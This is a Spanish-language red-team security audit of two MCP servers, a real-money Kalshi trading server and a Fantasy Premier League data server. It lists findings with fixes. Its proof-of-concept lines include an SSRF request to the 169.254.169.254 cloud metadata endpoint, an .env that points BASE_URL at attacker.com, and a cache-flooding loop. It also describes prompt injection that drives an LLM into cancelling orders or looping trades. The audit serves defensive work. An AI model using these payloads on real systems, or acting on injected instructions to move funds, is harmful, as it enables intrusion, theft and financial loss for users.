# 🔴 Análisis de Seguridad Red Team — MCP Kalshi & FPL

**Fecha:** 2026-08-12  
**Analista:** Hacker Ético / Red Team  
**Alcance:**
- `9crusher/mcp-server-kalshi` v0.2.3 (maneja dinero real)
- `nguyenanhducs/fpl-mcp-server` v1.0.3 (datos públicos + datos personales)

**Metodología:** Revisión manual de código fuente completo (SAST), análisis de vectores de ataque, evaluación de superficie de exposición LLM→MCP→API, y revisión de cobertura de tests de seguridad.

---

## 📊 Resumen Ejecutivo

| MCP | Severidad | Hallazgos | Riesgo Principal |
|-----|-----------|-----------|------------------|
| **Kalshi** | 🔴 **CRITICAL** (4) / 🟠 High (3) | 7 activos | Pérdida financiera directa, SSRF, redirección de API |
| **FPL** | 🟠 **HIGH** (3) / 🟡 Medium (3) | 6 activos | DoS por memoria, fuga de PII, evasión de controles |

> **Veredicto:** El MCP Kalshi presenta riesgos financieros inmediatos. Un prompt injection bien elaborado en el LLM puede causar pérdidas monetarias reales. El MCP FPL no maneja dinero pero expone datos personales y es vulnerable a DoS por agotamiento de memoria.

---

## 🎯 1. KALSHI MCP — Hallazgos Detallados

### 1.1 🔴 [CRITICAL] SSRF en `fetch_pdf_text()` — pdf.py:8

**Descripción:**  
La función `fetch_pdf_text()` acepta una URL arbitraria proveniente del LLM y la descarga directamente con `httpx.AsyncClient().get(url)` sin ninguna validación de host, esquema, ni whitelist.

```python
# pdf.py (líneas ~8-15)
async with httpx.AsyncClient() as client:
    response = await client.get(url)  # ← URL arbitraria del LLM
```

**Impacto:**  
- **SSRF (Server-Side Request Forgery):** El MCP puede ser usado para escanear/ataque la red interna donde corre el servidor MCP.
- **Data Exfiltration:** El LLM puede instruir al MCP a descargar PDFs de un servidor controlado por el atacante, filtrando información del entorno.
- **DoS:** Descargar archivos PDF masivos puede agotar memoria/disco.

**Prueba de Concepto (PoC):**
```
Usuario (o prompt injection): "Analiza este PDF: http://169.254.169.254/latest/meta-data/"
→ El MCP intenta acceder al metadata endpoint de AWS/Cloud
```

**Mitigación Recomendada:**
```python
ALLOWED_PDF_HOSTS = {
    "docs.kalshi.co",
    "kalshi-public.s3.amazonaws.com",
    # ... whitelist explícita
}

from urllib.parse import urlparse

def validate_pdf_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("https",):
        raise ValueError("Only HTTPS URLs allowed")
    if parsed.hostname not in ALLOWED_PDF_HOSTS:
        raise ValueError(f"Host not in whitelist: {parsed.hostname}")
    # Bloquear IPs privadas
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_reserved:
            raise ValueError("Private IPs not allowed")
    except ValueError:
        pass  # Es un hostname, continuar
```

**Oportunidad de Cambio:** Implementar `PdfUrlValidator` con whitelist de hosts Kalshi, bloqueo de esquemas no-HTTPS, y validación de IPs privadas (RFC 1918,  loopback, link-local).

---

### 1.2 🔴 [CRITICAL] `BASE_URL` Override permite Redirección a Servidor Malicioso

**Descripción:**  
`config.py` permite sobrescribir la URL base de la API Kalshi mediante la variable de entorno `BASE_URL`. Esta URL se usa para **todas** las operaciones autenticadas, incluyendo órdenes de trading.

```python
# config.py:32-35
class Settings(BaseSettings):
    BASE_URL: str | None = None
    # ...
    @property
    def rest_base_url(self) -> str:
        if self.BASE_URL:
            return self.BASE_URL.rstrip("/")  # ← OVERRIDE TOTAL
```

**Impacto:**  
- **MITM / Phishing de API:** Si un atacante compromete las variables de entorno (o el `.env`), puede redirigir todo el tráfico a un servidor proxy malicioso que registre credenciales y firme órdenes falsas.
- **Bypass de entorno demo/prod:** Un atacante puede forzar `BASE_URL=https://api.elections.kalshi.com` en un entorno que el usuario creía era demo.

**Prueba de Concepto:**
```bash
# .env comprometido
BASE_URL=https://attacker.com/fake-kalshi
```

**Mitigación Recomendada:**
```python
# URL permitidas hardcodeadas (no configurables)
KALSHI_PROD_URL = "https://api.elections.kalshi.com/trade-api/v2"
KALSHI_DEMO_URL = "https://demo-api.kalshi.co/trade-api/v2"

@property
def rest_base_url(self) -> str:
    if self.KALSHI_ENV == "prod":
        return KALSHI_PROD_URL
    return KALSHI_DEMO_URL
    # ELIMINAR BASE_URL como override
```

**Oportunidad de Cambio:** Eliminar `BASE_URL` como setting configurable. Usar solo `KALSHI_ENV` con valores hardcodeados. Agregar firma digital de la configuración o checksum de los endpoints permitidos.

---

### 1.3 🔴 [CRITICAL] Clave PEM Cargada sin Passphrase ni Chequeo de Permisos

**Descripción:**  
`base.py:13-16` carga la clave privada RSA desde un archivo PEM sin verificar:
1. Que el archivo tenga permisos restrictivos (e.g., `0o600`)
2. Que la clave esté protegida por passphrase
3. Que el archivo no sea accesible por otros usuarios del sistema

```python
# base.py
key_path = settings.KALSHI_PRIVATE_KEY_PATH
private_key = load_private_key_from_file(key_path)
```

**Impacto:**  
- Si el servidor MCP corre en un host compartido o el filesystem se compromete, la clave privada puede ser leída por cualquier usuario.
- Sin passphrase, el robo del archivo PEM equivale al robo total de la cuenta Kalshi.

**Mitigación Recomendada:**
```python
import os, stat

def load_private_key_from_file(path: str) -> rsa.RSAPrivateKey:
    # Chequear permisos del archivo
    mode = os.stat(path).st_mode
    if stat.S_IRGRP & mode or stat.S_IROTH & mode:
        raise PermissionError(
            f"Key file {path} has overly permissive permissions. "
            f"Run: chmod 600 {path}"
        )
    
    with open(path, "rb") as f:
        pem = f.read()
    
    # Intentar cargar sin passphrase primero
    try:
        return serialization.load_pem_private_key(pem, password=None)
    except ValueError:
        # Requerir passphrase
        passphrase = os.environ.get("KALSHI_KEY_PASSPHRASE")
        if not passphrase:
            raise ValueError("Key is encrypted but KALSHI_KEY_PASSPHRASE not set")
        return serialization.load_pem_private_key(
            pem, password=passphrase.encode()
        )
```

**Oportunidad de Cambio:** Implementar `SecureKeyLoader` con validación de permisos de archivo, soporte obligatorio de passphrase, y alerta de seguridad en logs si la clave está desprotegida.

---

### 1.4 🔴 [CRITICAL] `cancel_order` sin Gate de Confirmación

**Descripción:**  
`server.py:533` implementa `cancel_order` que llama directamente a la API Kalshi sin pasar por el mismo mecanismo de `confirm=false` por defecto que usan `create_order` y `amend_order`.

```python
# server.py ~533
async def handle_cancel_order(args: dict) -> list[TextContent]:
    order_id = args["order_id"]
    result = await kalshi_client.cancel_order(order_id=order_id)
    # ← No hay preview, no hay confirm gate
```

**Impacto:**  
- Un prompt injection puede causar cancelación masiva de órdenes abiertas, causando pérdida de posiciones de mercado y oportunidades de trading.

**Mitigación Recomendada:**
```python
async def handle_cancel_order(args: dict) -> list[TextContent]:
    confirm = args.get("confirm", False)
    order_id = args["order_id"]
    
    if not confirm:
        # Obtener detalles de la orden primero
        order_details = await kalshi_client.get_order(order_id)
        return [TextContent(
            type="text",
            text=f"⚠️ PREVIEW CANCEL:\n"
                 f"Order: {order_id}\n"
                 f"Ticker: {order_details['ticker']}\n"
                 f"Side: {order_details['side']}\n"
                 f"Count: {order_details['count']}\n\n"
                 f"To confirm cancellation, call with confirm=true"
        )]
    
    result = await kalshi_client.cancel_order(order_id=order_id)
    return [TextContent(type="text", text=f"✅ Order {order_id} cancelled.")]
```

**Oportunidad de Cambio:** Añadir `confirm=false` por defecto a **TODAS** las operaciones destructivas: `cancel_order`, `batch_cancel`, `decrease_order`.

---

### 1.5 🟠 [HIGH] Estado Global en Importación — `settings` y `kalshi_client`

**Descripción:**  
`server.py:95-104` instancia `settings` y `kalshi_client` como variables globales en el momento de importar el módulo. Esto significa que:
1. Las credenciales se cargan al importar, no al inicializar
2. No hay forma de reiniciar el cliente con nuevas credenciales sin reiniciar el proceso
3. Múltiples sesiones LLM comparten el mismo estado global

```python
# server.py:95-104
settings = get_settings()
kalshi_client = KalshiClient(
    base_url=settings.rest_base_url,
    api_key=settings.api_key_value(),
    private_key=load_private_key_from_file(settings.KALSHI_PRIVATE_KEY_PATH)
    if settings.KALSHI_PRIVATE_KEY_PATH
    else None,
)
```

**Impacto:**  
- **Fuga entre sesiones:** Si el MCP atiende múltiples usuarios (o contextos), todos comparten el mismo `kalshi_client` y por tanto la misma cuenta Kalshi.
- **Race conditions:** Si se cambia `BASE_URL` en runtime (aunque sea raro), no se refleja hasta reiniciar.
- **Testing difícil:** Los tests deben hacer monkeypatching global (como se ve en `test_orders.py`).

**Mitigación Recomendada:**
```python
# Usar factory pattern + contexto por request
from contextvars import ContextVar

kalshi_client_ctx: ContextVar[KalshiClient | None] = ContextVar("kalshi_client", default=None)

def get_kalshi_client() -> KalshiClient:
    client = kalshi_client_ctx.get()
    if client is None:
        # Crear nuevo cliente por contexto
        settings = get_settings()
        client = KalshiClient(...)
        kalshi_client_ctx.set(client)
    return client
```

**Oportunidad de Cambio:** Refactorizar a patrón factory con `ContextVar` para aislamiento por request, o al menos permitir reinicialización controlada del cliente.

---

### 1.6 🟠 [HIGH] Error Handling Genérico en `call_tool` filtra Stack Traces

**Descripción:**  
`server.py:593-598` captura cualquier excepción en `call_tool` y la envía al LLM como texto plano.

```python
# server.py:593-598
except Exception as e:
    return [TextContent(type="text", text=f"Error in {name}: {e}")]
```

**Impacto:**  
- **Information Disclosure:** Un atacante puede forzar errores específicos para obtener información del filesystem, versiones de librerías, rutas internas, estructura de código.
- **Reconnaissance facilitada:** El stack trace revela la estructura de directorios del servidor.

**Prueba de Concepto:**
```
LLM: "Llama a create_order con ticker='A' * 100000" 
→ Overflow o error de validación que revela rutas internas en el traceback
```

**Mitigación Recomendada:**
```python
import logging
import traceback

except Exception as e:
    # Log detallado solo en servidor
    logging.error(f"Tool {name} failed: {e}\n{traceback.format_exc()}")
    
    # Mensaje genérico al LLM
    return [TextContent(
        type="text", 
        text=f"An unexpected error occurred while processing '{name}'. "
             f"Please check your inputs and try again. "
             f"(Request ID: {request_id})"
    )]
```

**Oportunidad de Cambio:** Implementar `SecureErrorHandler` que loguee stack traces internamente pero envíe solo mensajes genéricos al LLM, con `request_id` para correlación.

---

### 1.7 🟠 [HIGH] Sin Rate Limiting Propio

**Descripción:**  
El MCP Kalshi no implementa ningún rate limiter propio. Depende únicamente del rate limiting de Kalshi API (que puede banear la cuenta) y del rate limiting del LLM (que no protege contra loops de herramientas).

**Impacto:**  
- Un prompt injection puede causar un loop infinito de llamadas a `create_order` → `cancel_order` → `create_order`, agotando límites de la API y potencialmente causando flags de fraude.
- Costo de operaciones: Cada orden tiene costo de transacción en mercados reales.

**Mitigación Recomendada:**
```python
# Implementar rate limiter por tipo de operación
from functools import wraps
import asyncio

class KalshiRateLimiter:
    def __init__(self):
        self.order_windows = deque()
        self.max_orders_per_minute = 10  # Conservador
    
    async def check_order_limit(self):
        now = time.time()
        # Limpiar ventana
        while self.order_windows and self.order_windows[0] < now - 60:
            self.order_windows.popleft()
        if len(self.order_windows) >= self.max_orders_per_minute:
            raise RateLimitError("Too many order operations. Please wait.")
        self.order_windows.append(now)

# Decorador para tools destructivas
def rate_limited(max_calls=10, window=60):
    def decorator(func):
        limiter = RateLimiter(max_calls, window)
        @wraps(func)
        async def wrapper(*args, **kwargs):
            await limiter.acquire()
            return await func(*args, **kwargs)
        return wrapper
    return decorator
```

**Oportunidad de Cambio:** Agregar `KalshiRateLimiter` con límites por tipo de operación (lectura vs escritura), y alertas cuando se acerque al límite.

---

### 1.8 🟡 [MEDIUM] Dependencias Pinnadas con `==` — Riesgo de Vulnerabilidades

**Descripción:**  
`pyproject.toml` pinnear `pydantic == 2.12.0` y `pydantic-settings == 2.11.0`. Esto impide recibir parches de seguridad automáticamente.

```toml
[project]
dependencies = [
    "pydantic == 2.12.0",
    "pydantic-settings == 2.11.0",
]
```

**Impacto:**  
- Si se descubre una vulnerabilidad en pydantic 2.12.0, el MCP no puede actualizar sin cambiar el código fuente.

**Mitigación Recomendada:**
```toml
# Usar versiones mínimas con upper bound seguro
"pydantic >= 2.12.0, < 3",
"pydantic-settings >= 2.11.0, < 3",
```

**Oportunidad de Cambio:** Migrar a rangos de versión semánticos y agregar `dependabot` o `snyk` para alertas de seguridad.

---

### 1.9 🟢 [INFO] Lo que KALSHI hace Bien ✅

| Práctica | Implementación |
|----------|---------------|
| `confirm=false` por defecto | ✅ `create_order`, `amend_order` requieren confirmación explícita |
| Firma RSA-PSS | ✅ Correcta implementación con `cryptography`, salt_length=MAX |
| `SecretStr` para API key | ✅ La key nunca se loguea en texto plano |
| Tests de auth | ✅ `test_auth.py` verifica firma y verificación con clave pública |
| Tests de preview | ✅ `test_orders.py` confirma que preview no coloca órdenes |
| Diferenciación prod/demo | ✅ `is_production` property con label visual |

---


## 🎯 2. FPL MCP — Hallazgos Detallados

### 2.1 🟠 [HIGH] Cache sin Límite de Tamaño — DoS por Memoria

**Descripción:**  
`cache.py:48` implementa un `CacheManager` basado en `dict` de Python que crece indefinidamente. No hay límite de tamaño, límite de memoria, ni política de evicción (LRU/LFU).

```python
# cache.py:48
class CacheManager:
    def __init__(self):
        self._cache: dict[str, CachedData] = {}  # ← Crece sin límite
```

**Impacto:**  
- **DoS por memoria:** Un atacante puede forzar la carga de múltiples conjuntos de datos grandes (e.g., múltiples gameweeks, múltiples managers) hasta agotar la RAM del proceso.
- **Session Bleed:** Aunque los datos son públicos, el cache compartido entre requests puede causar respuestas stale si no se invalida correctamente.

**Prueba de Concepto:**
```
# Loop que genera claves de cache únicas
for i in range(100000):
    cache_manager.set(f"custom_key_{i}", "X" * 10000, ttl=3600)
# Memoria agotada
```

**Mitigación Recomendada:**
```python
from collections import OrderedDict
import sys

class CacheManager:
    def __init__(self, max_entries: int = 1000, max_memory_mb: int = 50):
        self._cache: OrderedDict[str, CachedData] = OrderedDict()
        self.max_entries = max_entries
        self.max_memory_bytes = max_memory_mb * 1024 * 1024
        self._current_memory = 0
    
    def set(self, key: str, data: Any, ttl: int) -> None:
        # Estimar tamaño
        size = sys.getsizeof(data)
        
        # Evicción LRU si excede límites
        while (len(self._cache) >= self.max_entries or 
               self._current_memory + size > self.max_memory_bytes):
            if not self._cache:
                break
            oldest_key, oldest = self._cache.popitem(last=False)
            self._current_memory -= sys.getsizeof(oldest.data)
        
        self._cache[key] = CachedData(data=data, cached_at=..., ttl=ttl)
        self._current_memory += size
```

**Oportunidad de Cambio:** Implementar `BoundedCacheManager` con política LRU, límites de entradas y memoria, y métricas de evicción.

---

### 2.2 🟠 [HIGH] `User-Agent` Hardcodeado como `"Mozilla/5.0"` — Violación Potencial de ToS

**Descripción:**  
`client.py:26` usa un `User-Agent` que simula ser un navegador real, cuando en realidad es un bot/API client.

```python
# client.py:26
self.headers = {
    "User-Agent": "Mozilla/5.0",  # ← Falso, es un bot
    "Accept": "application/json",
}
```

**Impacto:**  
- **Violación de ToS de FPL:** La API oficial de FPL no tiene ToS públicos formales, pero el sitio web sí. El uso de `Mozilla/5.0` puede considerarse suplantación de identidad.
- **Bloqueo de IP:** Si FPL detecta patrones de bot con User-Agent de navegador, puede banear la IP sin previo aviso.
- **Riesgo legal:** En jurisdicciones con leyes anti-scraping estrictas (CFAA en EEUU, Computer Misuse Act en UK), la suplantación de User-Agent puede agravar cargos.

**Mitigación Recomendada:**
```python
self.headers = {
    "User-Agent": "fpl-mcp-server/1.0.3 (github.com/nguyenanhducs/fpl-mcp-server; +https://github.com/nguyenanhducs/fpl-mcp-server)",
    "Accept": "application/json",
    "X-Contact": "your@email.com",  # Opcional, buena práctica
}
```

**Oportunidad de Cambio:** Cambiar a User-Agent transparente que identifique el proyecto, versión, y URL del repositorio. Documentar esto en README.

---

### 2.3 🟠 [HIGH] Datos Personales Accesibles sin Autenticación — PII Exposure

**Descripción:**  
Múltiples tools del FPL MCP acceden a datos personales de managers (nombres reales, apellidos, historial de equipos, transfers, chips usados) sin requerir autenticación del manager objetivo:

- `fpl_get_manager_by_team_id` — expone `player_first_name`, `player_last_name`, `name` (team name)
- `fpl_get_manager_transfers_by_gameweek` — expone historial completo de transfers con timestamps
- `fpl_get_manager_chips` — expone estrategia de chips (información competitiva sensible)
- `fpl_analyze_rival` — compara dos managers expone datos de ambos

```python
# leagues.py:505-506
entry_data = await client.get_manager_entry(params.team_id)
player_name = f"{entry_data.get('player_first_name', '')} {entry_data.get('player_last_name', '')}".strip()
```

**Impacto:**  
- **Violación GDPR/privacidad:** Los nombres reales son PII (Personally Identifiable Information). El FPL MCP actúa como procesador de datos sin consentimiento del usuario final.
- **Doxxing facilitado:** Cualquiera con un `team_id` puede obtener el nombre real del manager.
- **OSINT:** Los historiales de transfer y chips permiten perfilar comportamiento de usuarios.

**Mitigación Recomendada:**
```python
# Opción A: Anonimización por defecto
async def get_manager_entry(team_id: int, include_pii: bool = False):
    data = await client.get_manager_entry(team_id)
    if not include_pii:
        # Eliminar campos personales
        data.pop("player_first_name", None)
        data.pop("player_last_name", None)
        data.pop("email", None)
    return data

# Opción B: Consentimiento explícito
# Requerir que el manager "verifique" su team_id antes de que otros accedan a sus datos
# (aunque la API FPL no lo soporte, el MCP puede documentar esto éticamente)

# Opción C: Modo privado
# Agregar configuración PRIVACY_MODE=True que anonimice todos los nombres
```

**Oportunidad de Cambio:** Implementar `PrivacyGuard` que anonimice PII por defecto, con opción explícita para desactivar. Documentar claramente qué datos se exponen en README.

---

### 2.4 🟡 [MEDIUM] `except Exception` Genérico en Múltiples Tools

**Descripción:**  
Casi todos los tools del FPL MCP usan `except Exception as e:` como manejo de error universal, ocultando la naturaleza real del error.

```python
# transfers.py:345
except Exception as e:
    return handle_api_error(e)

# leagues.py:252
except Exception as e:
    return handle_api_error(e)

# players.py:318, 385, 508, 607...
except Exception as e:
    return handle_api_error(e)
```

**Impacto:**  
- **Debugging imposible:** Los errores se silencian y se traducen a mensajes genéricos. Un administrador no puede diagnosticar problemas reales.
- **Errores de seguridad ocultos:** Si hay un intento de SQL injection (aunque no hay DB), path traversal, o similar, el error genérico lo oculta.

**Mitigación Recomendada:**
```python
# Jerarquía de excepciones específica
from src.exceptions import FPLAPIError, ValidationError, RateLimitError

try:
    result = await client.get_manager_entry(team_id)
except httpx.HTTPStatusError as e:
    if e.response.status_code == 404:
        raise ManagerNotFoundError(f"Team ID {team_id} not found")
    elif e.response.status_code == 429:
        raise RateLimitError("FPL API rate limit exceeded")
    raise FPLAPIError(f"HTTP {e.response.status_code}")
except httpx.TimeoutException:
    raise FPLAPIError("Request timed out")
except Exception as e:
    logging.exception(f"Unexpected error in get_manager_entry: {e}")
    raise FPLAPIError("An unexpected error occurred")
```

**Oportunidad de Cambio:** Refactorizar manejo de errores a excepciones específicas con logging estructurado, manteniendo mensajes amigables al usuario pero informativos en logs.

---

### 2.5 🟡 [MEDIUM] Fuzzy Matching sin Sanitización Previo del Input

**Descripción:**  
Aunque `validators.py` existe con funciones de sanitización, los tools de players (`players.py`) y transfers (`transfers.py`) no las usan consistentemente antes del fuzzy matching. El input del LLM pasa directamente a `store.find_players_by_name()`.

```python
# players.py:289
matches = store.find_players_by_name(params.player_name, fuzzy=True)
# ← params.player_name viene del LLM sin pasar por validate_player_name()
```

**Impacto:**  
- **ReDoS (Regular Expression Denial of Service):** El `SequenceMatcher` de Python y las operaciones de substring pueden ser lentas con inputs diseñados (e.g., strings repetitivos de 1000 caracteres).
- **Aunque limitado por Pydantic:** Los modelos `BaseModel` con `max_length=100` ofrecen cierta protección, no todos los tools usan estos modelos (algunos reciben parámetros directos).

**Mitigación Recomendada:**
```python
# Aplicar validación consistente en TODOS los entry points
from src.validators import validate_player_name

# En cada tool que recibe nombres:
player_name = validate_player_name(params.player_name)
matches = store.find_players_by_name(player_name, fuzzy=True)
```

**Oportunidad de Cambio:** Crear decorator `@validated_input` que aplique automáticamente los validators correspondientes antes de ejecutar la lógica del tool.

---

### 2.6 🟡 [MEDIUM] Rate Limiter Global No se Aplica a Todos los Endpoints

**Descripción:**  
`rate_limiter.py` implementa un token bucket, pero revisando `client.py`, no todos los métodos HTTP usan `rate_limiter.acquire()`. Algunos métodos como `get_element_summary`, `get_fixture_stats`, etc., parecen llamar directamente sin rate limiting.

```python
# rate_limiter.py:101
rate_limiter = RateLimiter(max_requests=100, window_seconds=60)

# client.py — no se ve acquire() en todos los métodos
```

**Impacto:**  
- El MCP puede exceder los límites de la API FPL y ser baneado temporalmente.
- En modo concurrente (múltiples requests del LLM), el rate limiter puede no ser suficiente.

**Mitigación Recomendada:**
```python
# Decorador universal para todos los métodos del client
from functools import wraps

def rate_limited(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        await rate_limiter.acquire()
        return await func(*args, **kwargs)
    return wrapper

class FPLClient:
    @rate_limited
    async def get_bootstrap_data(self):
        ...
    
    @rate_limited
    async def get_element_summary(self, element_id):
        ...
```

**Oportunidad de Cambio:** Aplicar `@rate_limited` universalmente en todos los métodos de `FPLClient` mediante metaclass o decorator automático.

---

### 2.7 🟢 [INFO] Lo que FPL hace Bien ✅

| Práctica | Implementación |
|----------|---------------|
| Validadores dedicados | ✅ `validators.py` con regex, rangos, sanitización de null bytes |
| Rate limiter implementado | ✅ Token bucket en `rate_limiter.py` |
| Modelos Pydantic | ✅ Todos los inputs usan `BaseModel` con validación |
| Tests de validadores | ✅ `test_validators.py` cubre XSS, null bytes, longitud |
| Tests de cache | ✅ `test_cache.py` cubre TTL, expiración, stats |
| Error handling amigable | ✅ `handle_api_error()` da guidance accionable |

---

## 📋 3. Matriz de Riesgo Consolidada

| ID | MCP | Hallazgo | Severidad | CVSS Est. | Esfuerzo Fix | Impacto Negocio |
|----|-----|----------|-----------|-----------|--------------|-----------------|
| K1 | Kalshi | SSRF en `fetch_pdf_text` | 🔴 Critical | 8.5 | Bajo | Data exfiltration, network scanning |
| K2 | Kalshi | `BASE_URL` override malicioso | 🔴 Critical | 9.0 | Bajo | MITM, credential theft, fund loss |
| K3 | Kalshi | Clave PEM sin passphrase/permisos | 🔴 Critical | 8.0 | Medio | Total account compromise |
| K4 | Kalshi | `cancel_order` sin confirm gate | 🔴 Critical | 7.5 | Bajo | Position loss, trading disruption |
| K5 | Kalshi | Estado global en importación | 🟠 High | 6.5 | Medio | Session bleed, race conditions |
| K6 | Kalshi | Error handling filtra stack traces | 🟠 High | 6.0 | Bajo | Information disclosure |
| K7 | Kalshi | Sin rate limiting propio | 🟠 High | 6.0 | Medio | API ban, cost overruns |
| K8 | Kalshi | Dependencias pinnadas `==` | 🟡 Medium | 5.0 | Bajo | Vuln. no parcheadas |
| F1 | FPL | Cache sin límite de tamaño | 🟠 High | 6.5 | Medio | DoS por memoria |
| F2 | FPL | User-Agent falso | 🟠 High | 5.5 | Bajo | ToS violation, IP ban |
| F3 | FPL | PII accesible sin auth | 🟠 High | 6.0 | Medio | GDPR violation, doxxing |
| F4 | FPL | `except Exception` genérico | 🟡 Medium | 4.5 | Medio | Debugging imposible |
| F5 | FPL | Fuzzy matching sin sanitización | 🟡 Medium | 4.0 | Bajo | ReDoS potencial |
| F6 | FPL | Rate limiter no universal | 🟡 Medium | 4.5 | Bajo | API rate limit exceeded |

---

## 🔧 4. Roadmap de Remediación Recomendado

### Fase 1 — Inmediata (24-48h) — Kalshi
1. [ ] **K4:** Agregar `confirm=false` a `cancel_order`, `batch_cancel`, `decrease_order`
2. [ ] **K1:** Implementar whitelist de hosts en `fetch_pdf_text()`
3. [ ] **K2:** Eliminar `BASE_URL` como setting configurable; usar solo `KALSHI_ENV`
4. [ ] **K6:** Reemplazar error handling genérico por mensajes seguros + logging interno

### Fase 2 — Corto Plazo (1 semana) — Kalshi
5. [ ] **K3:** Agregar chequeo de permisos de archivo + passphrase a clave PEM
6. [ ] **K7:** Implementar rate limiter por tipo de operación
7. [ ] **K5:** Refactorizar estado global a ContextVar/factory pattern
8. [ ] **K8:** Migrar dependencias pinnadas a rangos semánticos

### Fase 3 — Corto Plazo (1 semana) — FPL
9. [ ] **F1:** Implementar `BoundedCacheManager` con LRU y límite de memoria
10. [ ] **F2:** Cambiar User-Agent a identificación transparente
11. [ ] **F3:** Implementar `PrivacyGuard` para anonimizar PII por defecto
12. [ ] **F4:** Refactorizar excepciones a jerarquía específica

### Fase 4 — Mediano Plazo (2-4 semanas)
13. [ ] Agregar pipeline de seguridad: `bandit`, `safety`, `semgrep`
14. [ ] Implementar tests de seguridad automatizados (SSRF, injection, etc.)
15. [ ] Agregar auditoría de operaciones destructivas (logging inmutable)
16. [ ] Documentar modelo de amenazas (threat model) de cada MCP

---

## 🛡️ 5. Recomendaciones Arquitectónicas Transversales

### 5.1 Modelo de Amenazas LLM→MCP→API

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Usuario   │────▶│     LLM     │────▶│     MCP     │────▶│   API Ext   │
│  (Prompt)   │     │  (Agent)    │     │  (Server)   │     │  (Kalshi/   │
└─────────────┘     └─────────────┘     └─────────────┘     │   FPL)      │
                                                            └─────────────┘
                                   ▲
                                   │
                            ⚠️ VECTORES DE ATAQUE
                            1. Prompt Injection → LLM fuerza llamada MCP
                            2. Tool Poisoning → MCP modificado maliciosamente
                            3. Man-in-the-Middle → API redirigida
                            4. Data Exfiltration → Respuestas MCP filtradas
```

### 5.2 Principios de Seguridad para MCPs Financieros

| Principio | Implementación |
|-----------|---------------|
| **Zero Trust** | No confiar en inputs del LLM; validar todo |
| **Least Privilege** | El MCP solo debe tener permisos necesarios |
| **Defense in Depth** | Múltiples capas: validators + rate limiting + confirm gates |
| **Fail Secure** | Por defecto, las operaciones destructivas deben fallar seguro |
| **Observability** | Logging inmutable de todas las operaciones sensitivas |
| **Immutable Audit** | Logs de órdenes enviados a sistema externo (no solo local) |

### 5.3 Checklist de Seguridad para Nuevos MCPs

- [ ] ¿El MCP maneja dinero real? Si sí, requiere confirmación humana para operaciones destructivas
- [ ] ¿Acepta URLs del LLM? Si sí, implementar whitelist de hosts
- [ ] ¿Tiene credenciales en archivos? Si sí, requerir passphrase y permisos restrictivos
- [ ] ¿Expone PII? Si sí, anonimizar por defecto
- [ ] ¿Tiene estado global? Si sí, usar ContextVar o factory pattern
- [ ] ¿Filtra stack traces al LLM? Si sí, sanitizar errores
- [ ] ¿Tiene rate limiting? Si no, implementar token bucket
- [ ] ¿Las dependencias están pinnadas? Si sí, migrar a rangos semánticos
- [ ] ¿Los tests cubren vectores de seguridad? Si no, agregar tests de SSRF, injection, etc.

---

## 📎 Apéndice A — Cobertura de Tests de Seguridad

### Kalshi
| Test File | Cobertura de Seguridad | ¿Falta? |
|-----------|----------------------|---------|
| `test_auth.py` | ✅ Firma RSA-PSS, verificación con clave pública | — |
| `test_orders.py` | ✅ Preview no coloca, confirm coloca | ❌ No prueba cancel sin confirm |
| `test_pdf.py` | ✅ Truncación, HTTP error | ❌ **No prueba SSRF** |
| `test_config.py` | ✅ URL override, prod/demo detection | ❌ No prueba BASE_URL malicioso |
| `test_client_endpoints.py` | ? | Revisar manualmente |

### FPL
| Test File | Cobertura de Seguridad | ¿Falta? |
|-----------|----------------------|---------|
| `test_validators.py` | ✅ XSS, null bytes, longitud, chars inválidos | — |
| `test_cache.py` | ✅ TTL, expiración, stats | ❌ **No prueba límite de tamaño** |
| `test_rate_limiter.py` | ? | Revisar manualmente |
| `test_tools_*.py` | ? | Revisar manualmente |

---

## 📎 Apéndice B — Referencias

- [OWASP Top 10 2025](https://owasp.org/Top10/)
- [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [MCP Security Best Practices](https://modelcontextprotocol.io/docs/concepts/security)
- [Kalshi API Documentation](https://trading-api.readme.io/)
- [FPL API (unofficial)](https://fantasy.premierleague.com/api/)
- [RFC 1918 — Address Allocation for Private Internets](https://tools.ietf.org/html/rfc1918)
- [GDPR Article 9 — Processing of special categories of personal data](https://gdpr-info.eu/art-9-gdpr/)

---

*Reporte generado mediante análisis manual de código fuente (SAST). No se realizaron pruebas dinámicas (DAST) ni pentesting activo contra APIs en producción.*
